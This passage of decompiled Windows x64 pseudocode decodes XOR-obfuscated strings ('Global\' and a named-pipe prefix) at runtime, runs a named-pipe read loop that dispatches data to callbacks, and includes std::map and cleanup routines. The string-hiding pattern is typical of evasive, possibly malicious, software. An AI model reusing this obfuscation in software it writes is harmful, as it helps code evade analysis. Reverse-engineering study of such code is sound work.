    LOBYTE(v4) = (BYTE2(dword_1400DBDFC) + 80 * dword_1400DBDFC) ^ v4;
    dword_1400DBDFC = HIWORD(dword_1400DBDFC) + 18000 * (unsigned __int16)dword_1400DBDFC;
    v5 = (((unsigned int)dword_1400DBDF0 >> 13) ^ 32 * dword_1400DBDF0 ^ dword_1400DBDF0) + v4;
    dword_1400DBDF0 ^= ((unsigned int)dword_1400DBDF0 >> 13) ^ 32 * (dword_1400DBDF0 ^ (dword_1400DBDF0 << 12));
    byte_1400DBE00 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBE04 = v1 | 2;
    byte_1400DBE08[0] = v5 ^ 0x47;
    byte_1400DBE09 = (v5 - 1) ^ 0x6C;
    byte_1400DBE0A = (v5 - 2) ^ 0x6F;
    byte_1400DBE0B = (v5 - 3) ^ 0x62;
    byte_1400DBE0C = (v5 - 4) ^ 0x61;
    byte_1400DBE0D = (v5 - 5) ^ 0x6C;
    byte_1400DBE0E = (v5 - 6) ^ 0x5C;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DBE00;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBE08[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DBDEC: using guessed type int dword_1400DBDEC;
// 1400DBDF0: using guessed type int dword_1400DBDF0;
// 1400DBDF4: using guessed type int dword_1400DBDF4;
// 1400DBDFC: using guessed type int dword_1400DBDFC;
// 1400DBE00: using guessed type char byte_1400DBE00;
// 1400DBE04: using guessed type int dword_1400DBE04;
// 1400DBE09: using guessed type char byte_1400DBE09;
// 1400DBE0A: using guessed type char byte_1400DBE0A;
// 1400DBE0B: using guessed type char byte_1400DBE0B;
// 1400DBE0C: using guessed type char byte_1400DBE0C;
// 1400DBE0D: using guessed type char byte_1400DBE0D;
// 1400DBE0E: using guessed type char byte_1400DBE0E;

//----- (0000000140077190) ----------------------------------------------------
_QWORD *__fastcall sub_140077190(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBE10;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBE10 & 1 )
  {
    v5 = byte_1400DBE0F;
  }
  else
  {
    v4 = 69069 * dword_1400DBDF4 + 1234567;
    v1 = dword_1400DBE10 | 1;
    dword_1400DBDF4 = v4;
    dword_1400DBE10 |= 1u;
    dword_1400DBDEC = HIWORD(dword_1400DBDEC) + 36969 * (unsigned __int16)dword_1400DBDEC;
    LOBYTE(v4) = (BYTE2(dword_1400DBDFC) + 80 * dword_1400DBDFC) ^ v4;
    dword_1400DBDFC = HIWORD(dword_1400DBDFC) + 18000 * (unsigned __int16)dword_1400DBDFC;
    v5 = (((unsigned int)dword_1400DBDF0 >> 13) ^ 32 * dword_1400DBDF0 ^ dword_1400DBDF0) + v4;
    dword_1400DBDF0 ^= ((unsigned int)dword_1400DBDF0 >> 13) ^ 32 * (dword_1400DBDF0 ^ (dword_1400DBDF0 << 12));
    byte_1400DBE0F = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBE10 = v1 | 2;
    byte_1400DBE18[0] = v5 ^ 0x5C;
    byte_1400DBE19 = (v5 - 1) ^ 0x5C;
    byte_1400DBE1A = (v5 - 2) ^ 0x2E;
    byte_1400DBE1B = (v5 - 3) ^ 0x5C;
    byte_1400DBE1C = (v5 - 4) ^ 0x70;
    byte_1400DBE1D = (v5 - 5) ^ 0x69;
    byte_1400DBE1E = (v5 - 6) ^ 0x70;
    byte_1400DBE1F = (v5 - 7) ^ 0x65;
    byte_1400DBE20 = (v5 - 8) ^ 0x5C;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 9ui64 )
  {
    sub_140004790(Src, 9ui64, 0i64);
    v5 = byte_1400DBE0F;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_BYTE *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 9i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 9) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBE18[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 9 );
  return v3;
}
// 1400DBDEC: using guessed type int dword_1400DBDEC;
// 1400DBDF0: using guessed type int dword_1400DBDF0;
// 1400DBDF4: using guessed type int dword_1400DBDF4;
// 1400DBDFC: using guessed type int dword_1400DBDFC;
// 1400DBE0F: using guessed type char byte_1400DBE0F;
// 1400DBE10: using guessed type int dword_1400DBE10;
// 1400DBE19: using guessed type char byte_1400DBE19;
// 1400DBE1A: using guessed type char byte_1400DBE1A;
// 1400DBE1B: using guessed type char byte_1400DBE1B;
// 1400DBE1C: using guessed type char byte_1400DBE1C;
// 1400DBE1D: using guessed type char byte_1400DBE1D;
// 1400DBE1E: using guessed type char byte_1400DBE1E;
// 1400DBE1F: using guessed type char byte_1400DBE1F;
// 1400DBE20: using guessed type char byte_1400DBE20;

//----- (0000000140077370) ----------------------------------------------------
void __fastcall sub_140077370(__int64 a1, void *a2)
{
  void *v2; // r15
  __int64 v3; // r14
  _QWORD *v4; // rax
  DWORD v5; // edi
  DWORD v6; // eax
  void **v7; // rbx
  void *v8; // rdx
  _QWORD *v9; // rax
  _QWORD *v10; // rbx
  DWORD NumberOfBytesRead; // [rsp+30h] [rbp-D0h]
  void *Src; // [rsp+38h] [rbp-C8h]
  struct _OVERLAPPED Overlapped; // [rsp+40h] [rbp-C0h]
  HANDLE Handles; // [rsp+60h] [rbp-A0h]
  HANDLE v15; // [rsp+68h] [rbp-98h]
  __int64 v16; // [rsp+70h] [rbp-90h]
  void *v17; // [rsp+78h] [rbp-88h]
  __int64 v18; // [rsp+88h] [rbp-78h]
  unsigned __int64 v19; // [rsp+90h] [rbp-70h]
  char Dst; // [rsp+A0h] [rbp-60h]

  v16 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = operator new(0x20ui64);
  if ( v4 )
  {
    v4[3] = 15i64;
    v4[2] = 0i64;
    *(_BYTE *)v4 = 0;
  }
  else
  {
    v4 = 0i64;
  }
  Src = v4;
  Overlapped.Internal = 0i64;
  Overlapped.InternalHigh = 0i64;
  Overlapped.Pointer = 0i64;
  Overlapped.hEvent = CreateEventW(0i64, 1, 0, 0i64);
  while ( *(_BYTE *)(v3 + 8) )
  {
    memset(&Dst, 0, 0x800ui64);
    NumberOfBytesRead = 0;
    v5 = 0;
    SetLastError(0);
    if ( !ReadFile(v2, &Dst, 0x800u, &NumberOfBytesRead, &Overlapped) )
    {
      v6 = GetLastError();
      v5 = v6;
      if ( v6 == 997 || v6 == 234 )
      {
        Handles = *(HANDLE *)(v3 + 16);
        v15 = Overlapped.hEvent;
        if ( !WaitForMultipleObjects(2u, &Handles, 0, 0xFFFFFFFF) )
          break;
        if ( !GetOverlappedResult(v2, &Overlapped, &NumberOfBytesRead, 1) )
          v5 = GetLastError();
        ResetEvent(Overlapped.hEvent);
      }
      if ( v5 == 109 )
        break;
    }
    v7 = (void **)Src;
    sub_140004CA0(Src, &Dst, NumberOfBytesRead);
    if ( v5 != 234 )
    {
      if ( v7[2] )
      {
        (*(void (__fastcall **)(_QWORD, void **, void **))(**(_QWORD **)(v3 + 128) + 16i64))(
          *(_QWORD *)(v3 + 128),
          &v17,
          v7);
        if ( v18 )
        {
          v8 = &v17;
          if ( v19 >= 0x10 )
            v8 = v17;
          (*(void (__fastcall **)(_QWORD, void *))(**(_QWORD **)(v3 + 112) + 8i64))(*(_QWORD *)(v3 + 112), v8);
        }
        if ( v19 >= 0x10 )
          operator delete(v17);
      }
      v9 = operator new(0x20ui64);
      if ( v9 )
      {
        v9[3] = 15i64;
        v9[2] = 0i64;
        *(_BYTE *)v9 = 0;
      }
      else
      {
        v9 = 0i64;
      }
      Src = v9;
      if ( v7 )
      {
        if ( (unsigned __int64)v7[3] >= 0x10 )
          operator delete(*v7);
        v7[3] = (void *)15;
        v7[2] = 0i64;
        *(_BYTE *)v7 = 0;
        operator delete(v7);
      }
    }
  }
  CloseHandle(Overlapped.hEvent);
  DisconnectNamedPipe(v2);
  CloseHandle(v2);
  v10 = Src;
  if ( Src )
  {
    if ( *((_QWORD *)Src + 3) >= 0x10ui64 )
      operator delete(*(void **)Src);
    v10[3] = 15i64;
    v10[2] = 0i64;
    *(_BYTE *)v10 = 0;
    operator delete(v10);
  }
}

//----- (0000000140077630) ----------------------------------------------------
_BOOL8 __fastcall sub_140077630(__int64 a1)
{
  __int64 v1; // rbx
  volatile signed __int32 **v2; // rsi
  volatile signed __int32 *v3; // rax
  void *v4; // rbx
  HANDLE v5; // rax
  void (__fastcall ***v6)(void *, _QWORD); // rbx
  HANDLE v7; // rax
  BOOL (__fastcall *v9)(__int64); // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  LPVOID v11; // [rsp+50h] [rbp+8h]
  LPVOID lpMem; // [rsp+58h] [rbp+10h]

  v1 = a1;
  v2 = (volatile signed __int32 **)(a1 + 104);
  if ( !(unsigned __int8)sub_1400362F0((__int64 *)(a1 + 104)) )
  {
    *(_BYTE *)(v1 + 8) = 1;
    *(_QWORD *)(v1 + 16) = CreateEventW(0i64, 1, 0, 0i64);
    v9 = sub_140076C70;
    v10 = v1;
    sub_140076670((char **)&v11, &v9);
    sub_14001DAE0(&v11);
    sub_140018FB0(v2, (volatile signed __int32 **)&v11);
    v3 = (volatile signed __int32 *)v11;
    lpMem = v11;
    v11 = 0i64;
    if ( lpMem && !_InterlockedDecrement(v3 + 2) )
    {
      v4 = lpMem;
      (**(void (__fastcall ***)(LPVOID, _QWORD))lpMem)(lpMem, 0i64);
      v5 = GetProcessHeap();
      HeapFree(v5, 0, v4);
    }
    sub_1400366B0((volatile signed __int32 **)&v11);
    v6 = (void (__fastcall ***)(void *, _QWORD))v11;
    if ( v11 && !_InterlockedDecrement((volatile signed __int32 *)v11 + 2) )
    {
      (**v6)(v6, 0i64);
      v7 = GetProcessHeap();
      HeapFree(v7, 0, v6);
    }
    sub_140036A80();
  }
  return sub_1400362F0((__int64 *)v2);
}

//----- (0000000140077750) ----------------------------------------------------
_BOOL8 __fastcall sub_140077750(__int64 a1)
{
  return sub_1400362F0((__int64 *)(a1 + 104));
}

//----- (0000000140077760) ----------------------------------------------------
bool __fastcall sub_140077760(__int64 a1)
{
  __int64 v1; // rsi
  _QWORD *v2; // rdi
  _QWORD *i; // rbx

  v1 = a1;
  if ( (unsigned __int8)sub_1400362F0((__int64 *)(a1 + 104)) )
  {
    *(_BYTE *)(v1 + 8) = 0;
    SetEvent(*(HANDLE *)(v1 + 16));
    sub_14001D1F0((__int64 *)(v1 + 104));
    v2 = *(_QWORD **)(v1 + 88);
    for ( i = (_QWORD *)*v2; i != v2; i = (_QWORD *)*i )
      sub_14001D1F0(i + 2);
    sub_140077860((void ***)(v1 + 88));
    CloseHandle(*(HANDLE *)(v1 + 16));
  }
  return (unsigned __int8)sub_1400362F0((__int64 *)(v1 + 104)) == 0;
}

//----- (0000000140077860) ----------------------------------------------------
void __fastcall sub_140077860(void ***a1)
{
  void ***v1; // r14
  volatile signed __int32 **v2; // rdi
  volatile signed __int32 *v3; // rsi
  volatile signed __int32 *v4; // rbx
  HANDLE v5; // rax

  v1 = a1;
  v2 = (volatile signed __int32 **)**a1;
  **a1 = *a1;
  (*a1)[1] = *a1;
  a1[1] = 0i64;
  if ( v2 != (volatile signed __int32 **)*a1 )
  {
    do
    {
      v3 = *v2;
      sub_1400366B0(v2 + 2);
      v4 = v2[2];
      if ( v4 )
      {
        if ( !_InterlockedDecrement(v4 + 2) )
        {
          (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v4)(v4, 0i64);
          v5 = GetProcessHeap();
          HeapFree(v5, 0, (LPVOID)v4);
        }
      }
      operator delete(v2);
      v2 = (volatile signed __int32 **)v3;
    }
    while ( v3 != (volatile signed __int32 *)*v1 );
  }
}

//----- (0000000140077900) ----------------------------------------------------
__int64 __fastcall sub_140077900(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD, _QWORD))(a1 + 120))(*(_QWORD *)(a1 + 128), *(_QWORD *)(a1 + 136));
}

//----- (0000000140077920) ----------------------------------------------------
_QWORD *__fastcall sub_140077920(_QWORD *a1, __int64 a2, _QWORD **a3)
{
  _QWORD **v3; // rbx
  _QWORD *result; // rax

  v3 = a3;
  result = sub_140079270(a1);
  *((_WORD *)result + 12) = 0;
  if ( result != (_QWORD *)-32i64 )
  {
    result[4] = **v3;
    result[5] = 0i64;
  }
  return result;
}

//----- (0000000140077970) ----------------------------------------------------
_QWORD *__fastcall sub_140077970(_QWORD *a1, _QWORD *a2, void *a3, _QWORD *a4, __int64 a5, _QWORD *a6)
{
  unsigned __int64 v6; // rax
  _QWORD *v7; // r10
  _QWORD *v8; // rbx
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int64 *v11; // rcx
  __int64 *v12; // r8
  __int64 *v13; // rdx
  __int64 v14; // rdx
  _QWORD *v15; // rdx
  _QWORD *v16; // rcx
  _QWORD *v17; // rdx
  _QWORD *v18; // r8
  __int64 v19; // rcx
  _QWORD *v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rcx
  __int64 v25; // rax
  __int64 v26; // rcx
  _QWORD *result; // rax

  v6 = a1[1];
  v7 = a1;
  v8 = a2;
  if ( v6 >= 0x555555555555554i64 )
  {
    operator delete(a6);
    std::_Xlength_error("map/set<T> too long");
    __debugbreak();
  }
  v7[1] = v6 + 1;
  a6[1] = a4;
  if ( a4 == (_QWORD *)*v7 )
  {
    *(_QWORD *)(*v7 + 8i64) = a6;
    *(_QWORD *)*v7 = a6;
    v9 = *v7;
LABEL_9:
    *(_QWORD *)(v9 + 16) = a6;
    goto LABEL_10;
  }
  if ( !(_BYTE)a3 )
  {
    a4[2] = a6;
    v9 = *v7;
    if ( a4 != *(_QWORD **)(*v7 + 16i64) )
      goto LABEL_10;
    goto LABEL_9;
  }
  *a4 = a6;
  if ( a4 == *(_QWORD **)*v7 )
    *(_QWORD *)*v7 = a6;
LABEL_10:
  v10 = a6;
  while ( !*(_BYTE *)(v10[1] + 24i64) )
  {
    v11 = (__int64 *)v10[1];
    v12 = (__int64 *)v11[1];
    v13 = (__int64 *)*v12;
    if ( v11 == (__int64 *)*v12 )
    {
      v14 = v12[2];
      if ( *(_BYTE *)(v14 + 24) )
      {
        if ( v10 == (_QWORD *)v11[2] )
        {
          v15 = (_QWORD *)v11[2];
          v10 = (_QWORD *)v10[1];
          v11[2] = *v15;
          if ( !*(_BYTE *)(*v15 + 25i64) )
            *(_QWORD *)(*v15 + 8i64) = v11;
          v15[1] = v11[1];
          if ( v11 == *(__int64 **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v15;
          }
          else
          {
            v16 = (_QWORD *)v11[1];
            if ( v10 == (_QWORD *)*v16 )
              *v16 = v15;
            else
              v16[2] = v15;
          }
          *v15 = v10;
          v10[1] = v15;
        }
        *(_BYTE *)(v10[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v10[1] + 8i64);
        v18 = (_QWORD *)*v17;
        *v17 = *(_QWORD *)(*v17 + 16i64);
        v19 = v18[2];
        if ( !*(_BYTE *)(v19 + 25) )
          *(_QWORD *)(v19 + 8) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
          v18[2] = v17;
        }
        else
        {
          v20 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)v20[2] )
            v20[2] = v18;
          else
            *v20 = v18;
          v18[2] = v17;
        }
LABEL_50:
        v17[1] = v18;
        continue;
      }
      *((_BYTE *)v11 + 24) = 1;
      *(_BYTE *)(v14 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
      v10 = *(_QWORD **)(v10[1] + 8i64);
    }
    else
    {
      if ( *((_BYTE *)v13 + 24) )
      {
        if ( v10 == (_QWORD *)*v11 )
        {
          v21 = *v11;
          v10 = (_QWORD *)v10[1];
          *v11 = *(_QWORD *)(*v11 + 16);
          v22 = *(_QWORD *)(v21 + 16);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v10;
          *(_QWORD *)(v21 + 8) = v10[1];
          if ( v10 == *(_QWORD **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v21;
          }
          else
          {
            v23 = (_QWORD *)v10[1];
            if ( v10 == (_QWORD *)v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *(_QWORD *)(v21 + 16) = v10;
          v10[1] = v21;
        }
        *(_BYTE *)(v10[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v10[1] + 8i64);
        v18 = (_QWORD *)v17[2];
        v17[2] = *v18;
        if ( !*(_BYTE *)(*v18 + 25i64) )
          *(_QWORD *)(*v18 + 8i64) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
        }
        else
        {
          v24 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)*v24 )
            *v24 = v18;
          else
            v24[2] = v18;
        }
        *v18 = v17;
        goto LABEL_50;
      }
      *((_BYTE *)v11 + 24) = 1;
      *((_BYTE *)v13 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
      v10 = *(_QWORD **)(v10[1] + 8i64);
    }
  }
  v25 = *v7;
  *v8 = a6;
  v26 = *(_QWORD *)(v25 + 8);
  result = v8;
  *(_BYTE *)(v26 + 24) = 1;
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140077C20) ----------------------------------------------------
_QWORD *__usercall sub_140077C20@<rax>(void *a1@<rcx>, _QWORD *a2@<rdx>, __int64 a3@<r8>, unsigned __int64 *a4@<r9>, __int64 a5)
{
  unsigned __int64 *v5; // r10
  _QWORD *v6; // rbx
  _QWORD *v7; // r11
  _QWORD *v9; // rcx
  __int64 v10; // ST20_8
  _QWORD *v11; // r9
  _QWORD *v12; // r9
  unsigned __int64 v13; // rsi
  bool v14; // cf
  __int64 v15; // rax
  _QWORD *v16; // r9
  __int64 j; // rax
  __int64 i; // rdx
  _QWORD *v19; // r9
  _QWORD *v20; // r9
  __int64 **v21; // rax
  __int64 *l; // rax
  __int64 k; // rax
  char v24; // [rsp+38h] [rbp-20h]

  v5 = a4;
  v6 = a2;
  v7 = a1;
  if ( !*((_QWORD *)a1 + 1) )
  {
    LOBYTE(a3) = 1;
    sub_140077970(a1, a2, (void *)a3, *(_QWORD **)a1, (__int64)a4, (_QWORD *)a5);
    return v6;
  }
  v9 = *(_QWORD **)a1;
  if ( a3 == *v9 )
  {
    if ( *a4 < *(_QWORD *)(a3 + 32) )
    {
      v10 = (__int64)a4;
      v11 = (_QWORD *)a3;
      LOBYTE(a3) = 1;
      sub_140077970(v7, a2, (void *)a3, v11, v10, (_QWORD *)a5);
      return v6;
    }
    goto LABEL_43;
  }
  if ( (_QWORD *)a3 == v9 )
  {
    v12 = (_QWORD *)v9[2];
    if ( v12[4] < *v5 )
    {
      sub_140077970(v7, a2, 0i64, v12, (__int64)v5, (_QWORD *)a5);
      return v6;
    }
    goto LABEL_43;
  }
  v13 = *a4;
  v14 = *(_QWORD *)(a3 + 32) < *a4;
  if ( *(_QWORD *)(a3 + 32) > *a4 )
  {
    v15 = a3;
    if ( *(_BYTE *)(a3 + 25) )
    {
      v16 = *(_QWORD **)(a3 + 16);
    }
    else
    {
      v16 = *(_QWORD **)a3;
      if ( *(_BYTE *)(*(_QWORD *)a3 + 25i64) )
      {
        for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
        {
          if ( v15 != *(_QWORD *)i )
            break;
          v15 = i;
        }
        v16 = (_QWORD *)v15;
        if ( !*(_BYTE *)(v15 + 25) )
          v16 = (_QWORD *)i;
      }
      else
      {
        for ( j = v16[2]; !*(_BYTE *)(j + 25); j = *(_QWORD *)(j + 16) )
          v16 = (_QWORD *)j;
      }
    }
    if ( v16[4] < v13 )
    {
      if ( *(_BYTE *)(v16[2] + 25i64) )
      {
        sub_140077970(v7, v6, 0i64, v16, (__int64)v5, (_QWORD *)a5);
      }
      else
      {
        v19 = (_QWORD *)a3;
        LOBYTE(a3) = 1;
        sub_140077970(v7, v6, (void *)a3, v19, (__int64)v5, (_QWORD *)a5);
      }
      return v6;
    }
    v14 = *(_QWORD *)(a3 + 32) < v13;
  }
  if ( !v14 )
    goto LABEL_43;
  v20 = (_QWORD *)a3;
  if ( !*(_BYTE *)(a3 + 25) )
  {
    v21 = *(__int64 ***)(a3 + 16);
    if ( *((_BYTE *)v21 + 25) )
    {
      for ( k = *(_QWORD *)(a3 + 8); !*(_BYTE *)(k + 25); k = *(_QWORD *)(k + 8) )
      {
        if ( v20 != *(_QWORD **)(k + 16) )
          break;
        v20 = (_QWORD *)k;
      }
      v20 = (_QWORD *)k;
    }
    else
    {
      v20 = *(_QWORD **)(a3 + 16);
      for ( l = *v21; !*((_BYTE *)l + 25); l = (__int64 *)*l )
        v20 = l;
    }
  }
  if ( v20 != v9 && v13 >= v20[4] )
  {
LABEL_43:
    *v6 = *(_QWORD *)sub_140077E80(v7, (__int64)&v24, 0i64, v5, (void *)a5);
    return v6;
  }
  if ( *(_BYTE *)(*(_QWORD *)(a3 + 16) + 25i64) )
  {
    sub_140077970(v7, v6, 0i64, (_QWORD *)a3, (__int64)v5, (_QWORD *)a5);
  }
  else
  {
    LOBYTE(a3) = 1;
    sub_140077970(v7, v6, (void *)a3, v20, (__int64)v5, (_QWORD *)a5);
  }
  return v6;
}

//----- (0000000140077E80) ----------------------------------------------------
__int64 __fastcall sub_140077E80(void *a1, __int64 a2, void *a3, unsigned __int64 *a4, void *a5)
{
  unsigned __int64 *v5; // rsi
  char v6; // r10
  __int64 v7; // rdi
  __int64 *v8; // rax
  __int64 *v9; // r9
  unsigned __int64 v10; // rdx
  __int64 *v11; // rbx
  __int64 *j; // rax
  __int64 *i; // rax
  int v15; // [rsp+50h] [rbp+8h]

  v5 = a4;
  v6 = (char)a3;
  v7 = a2;
  v8 = *(__int64 **)(*(_QWORD *)a1 + 8i64);
  v9 = *(__int64 **)a1;
  LOBYTE(a3) = 1;
  if ( !*((_BYTE *)v8 + 25) )
  {
    v10 = *v5;
    do
    {
      v9 = v8;
      if ( v6 )
        LOBYTE(a3) = v8[4] >= v10;
      else
        LOBYTE(a3) = v10 < v8[4];
      if ( (_BYTE)a3 )
        v8 = (__int64 *)*v8;
      else
        v8 = (__int64 *)v8[2];
    }
    while ( !*((_BYTE *)v8 + 25) );
  }
  v11 = v9;
  if ( (_BYTE)a3 )
  {
    if ( v9 == **(__int64 ***)a1 )
    {
      LOBYTE(a3) = 1;
      *(_QWORD *)v7 = *sub_140077970(a1, &v15, a3, v9, (__int64)v5, a5);
      *(_BYTE *)(v7 + 8) = 1;
      return v7;
    }
    if ( *((_BYTE *)v9 + 25) )
    {
      v11 = (__int64 *)v9[2];
    }
    else if ( *(_BYTE *)(*v9 + 25) )
    {
      for ( i = (__int64 *)v9[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
      {
        if ( v11 != (__int64 *)*i )
          break;
        v11 = i;
      }
      if ( !*((_BYTE *)v11 + 25) )
        v11 = i;
    }
    else
    {
      v11 = (__int64 *)*v9;
      for ( j = *(__int64 **)(*v9 + 16); !*((_BYTE *)j + 25); j = (__int64 *)j[2] )
        v11 = j;
    }
  }
  if ( v11[4] >= *v5 )
  {
    operator delete(a5);
    *(_QWORD *)v7 = v11;
    *(_BYTE *)(v7 + 8) = 0;
  }
  else
  {
    *(_QWORD *)v7 = *sub_140077970(a1, &v15, a3, v9, (__int64)v5, a5);
    *(_BYTE *)(v7 + 8) = 1;
  }
  return v7;
}

//----- (0000000140077FE0) ----------------------------------------------------
char *__fastcall sub_140077FE0(_OWORD *a1)
{
  _OWORD *v1; // rdi
  HANDLE v2; // rax
  const char *v3; // rax
  char *v4; // rbx
  void *v6; // [rsp+28h] [rbp-20h]
  const char *v7; // [rsp+58h] [rbp+10h]
  const char *v8; // [rsp+60h] [rbp+18h]
  const char *v9; // [rsp+68h] [rbp+20h]

  v1 = a1;
  v2 = GetProcessHeap();
  v3 = (const char *)HeapAlloc(v2, 0, 0x88ui64);
  v4 = (char *)v3;
  v7 = v3;
  if ( !v3 )
  {
    v7 = "bad allocation";
    std::exception::exception((std::exception *)&v6, &v7, 1);
    v6 = &loc_1400A3C88;
    sub_140017340(&v6);
  }
  v8 = v3;
  v9 = v3;
  sub_1400186C0((__int64)v3);
  *(_QWORD *)v4 = &off_1400A5108;
  *(_OWORD *)(v4 + 120) = *v1;
  return v4;
}
// 140017340: using guessed type __int64 __fastcall sub_140017340(_QWORD);
// 1400A1990: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *, _DWORD);
// 1400A5108: using guessed type __int64 (__fastcall *off_1400A5108)(void *);

//----- (0000000140078090) ----------------------------------------------------
char **__fastcall sub_140078090(char **a1, _OWORD *a2)
{
  char **v2; // rbx
  char *v3; // rax

  v2 = a1;
  v3 = sub_140077FE0(a2);
  *v2 = v3;
  if ( v3 )
    _InterlockedIncrement((volatile signed __int32 *)v3 + 2);
  return v2;
}

//----- (0000000140078250) ----------------------------------------------------
void __fastcall sub_140078250(_QWORD *a1)
{
  int v1; // eax

  v1 = Mtx_unlock(*a1);
  if ( v1 )
    std::_Throw_C_error(v1);
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);

//----- (0000000140078280) ----------------------------------------------------
void __fastcall sub_140078280(__int64 **a1)
{
  void **v1; // rbx
  char v2; // [rsp+30h] [rbp+8h]

  v1 = (void **)a1;
  sub_140079390(a1, (__int64 *)&v2, **a1, (__int64)*a1);
  operator delete(*v1);
}

//----- (00000001400782B0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_1400782B0(_QWORD *a1))()
{
  _QWORD *v1; // rdi
  volatile signed __int32 *v2; // rbx
  HANDLE v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 (__fastcall **result)(); // rax
  char v6; // [rsp+58h] [rbp+10h]
  _QWORD *v7; // [rsp+60h] [rbp+18h]

  v1 = a1;
  *a1 = &off_1400AFA28;
  sub_140078560((__int64)a1);
  sub_140079390((__int64 **)v1 + 16, (__int64 *)&v6, *(_QWORD *)v1[16], v1[16]);
  operator delete((void *)v1[16]);
  v7 = v1 + 15;
  sub_1400366B0((volatile signed __int32 **)v1 + 15);
  v2 = (volatile signed __int32 *)v1[15];
  if ( v2 && !_InterlockedDecrement(v2 + 2) )
  {
    (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v2)(v2, 0i64);
    v3 = GetProcessHeap();
    HeapFree(v3, 0, (LPVOID)v2);
  }
  v4 = (volatile signed __int32 *)v1[14];
  if ( v4 )
  {
    if ( !_InterlockedDecrement(v4 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  _Mtx_destroy(v1 + 12);
  if ( v1[11] >= 0x10ui64 )
    operator delete((void *)v1[8]);
  v1[11] = 15i64;
  v1[10] = 0i64;
  *((_BYTE *)v1 + 64) = 0;
  if ( v1[7] >= 0x10ui64 )
    operator delete((void *)v1[4]);
  v1[7] = 15i64;
  v1[6] = 0i64;
  *((_BYTE *)v1 + 32) = 0;
  result = &off_1400A56B0;
  *v1 = &off_1400A56B0;
  return result;
}
// 1400A1628: using guessed type __int64 __fastcall _Mtx_destroy(_QWORD);
// 1400A56B0: using guessed type __int64 (__fastcall *off_1400A56B0)();
// 1400AFA28: using guessed type __int64 (__fastcall *off_1400AFA28)(void *);

